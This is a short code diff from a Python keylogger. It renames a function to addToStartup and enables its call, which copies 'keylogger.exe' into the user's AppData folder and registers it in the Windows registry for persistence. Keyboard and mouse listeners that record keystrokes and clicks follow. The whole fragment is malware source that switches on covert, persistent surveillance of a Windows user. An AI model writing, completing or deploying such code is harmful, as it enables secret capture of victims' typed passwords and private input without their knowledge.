@@ -134,7 +134,7 @@ def on_click(x, y, button, pressed):
             print(e)
 
 
-def copy_script():
+def addToStartup():
     USER_NAME = getpass.getuser()
     src = str(os.getcwd()) + '\\keylogger.exe'
     dst = r'C:\Users\%s\AppData' % USER_NAME
@@ -147,7 +147,7 @@ def copy_script():
                       winreg.REG_SZ, exePath)  # file_path is path of file after coping it
 
 
-# copy_script()
+addToStartup()
 
 # Collect events of mouse clicks and keyboard keys
 with keyboard.Listener(on_press=on_press) as k_listener, \
